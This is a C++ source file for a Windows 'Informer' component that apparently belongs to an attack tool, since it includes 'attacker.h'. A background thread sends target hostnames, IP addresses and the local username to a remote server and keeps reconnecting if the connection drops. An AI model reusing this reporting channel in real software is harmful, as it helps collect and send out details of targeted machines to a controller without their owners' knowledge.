
#include <windows.h>
#include <WinSock2.h>
#include "informer.h"
#include "utils/BaseSocket.h"
#include <stdio.h>
#include "attacker.h"
#include "Public.h"
#include "ssl/sslPublic.h"


int __stdcall Informer::notifyServer(Informer * instance) {
	MSG tmpmsg = { 0 };
	int ret = GetMessageA(&tmpmsg, 0, 0, 0);

	char szout[1024];
	int outlen = 0;

	int s = BaseSocket::connectServer(instance->mServerIP,INFORMER_PORT);
	if (s == INVALID_SOCKET)
	{

		wsprintfA(szout,"Informer socket error:%d\r\n",GetLastError());
		//MessageBoxA(0, szout, szout, MB_OK);
		//getchar();
		//ExitProcess(0);
		return -1;
	}

	TARGET_INFO ti = { 0 };
	while (1)
	{
		MSG msg = { 0 };
		ret = GetMessageA(&msg, 0, 0, 0);
 		if (ret && msg.message == TARGET_INFO_TAG)
		{
			memset(&ti, 0, sizeof(TARGET_INFO));
			if (msg.wParam > 0)
			{
				char * hostname = (char*)msg.wParam;
				lstrcpyA(ti.host, hostname);
				delete hostname;
			}
			
			ti.ip = (unsigned long)msg.lParam;

			lstrcpyA((char*)ti.user, G_USERNAME);
			
			ti.len = sizeof(TARGET_INFO) - MAX_DOMAIN_NAME_SIZE + lstrlenA(ti.host);
			ti.cmd = TARGET_INFO_TAG;
		}
		else {
			continue;
		}

		ret = send(s, (char*)&ti, ti.len, 0);
		if (ret <= 0)
		{
			closesocket(s);

			outlen = wsprintfA(szout,"Informer send info error,cmd:%u\r\n", msg.message);
			Public::WriteLogFile(szout);
			printf(szout);
			
			while (1)
			{
				s = BaseSocket::connectServer(instance->mServerIP, INFORMER_PORT);
				if (s == INVALID_SOCKET)
				{
					Sleep(3000);
				}
				else {
					break;
				}
			}

			ret = send(s, (char*)&ti, ti.len, 0);
			if (ret <= 0)
			{
				outlen = wsprintfA(szout,"Informer second send info error,cmd:%u,ip:%08x\r\n", msg.message, msg.lParam);
				Public::WriteLogFile(szout);
				printf(szout);

				continue;
			}
			else {
				printf("Informer second send info ok,cmd:%u,ip:%08x\r\n", msg.message, msg.lParam);
			}
		}
	}

	closesocket(s);
	return 0;
}


int Informer::notify(unsigned long ip,char* host) {

	char *strhost = new char [256];
	lstrcpyA(strhost, host);
	int iRet = PostThreadMessageA(mInformerTID, TARGET_INFO_TAG, (WPARAM)strhost, (LPARAM)ip);
	if (iRet <= 0)
	{
		printf("Informer PostThreadMessageA error:%u\r\n", GetLastError());
		
	}
	return iRet;
}







Informer::Informer(LPVOID serverIP) {
	if (mInstance)
	{
		return;
	}
	mInstance = this;

	mServerIP = (DWORD)serverIP;
	this->mInstance = this;
	CloseHandle(CreateThread(0, PROXY_THREAD_STACK_SIZE, (LPTHREAD_START_ROUTINE)Informer::notifyServer,
		(LPVOID)this->mInstance, STACK_SIZE_PARAM_IS_A_RESERVATION, &mInformerTID));
}



Informer::~Informer() {

}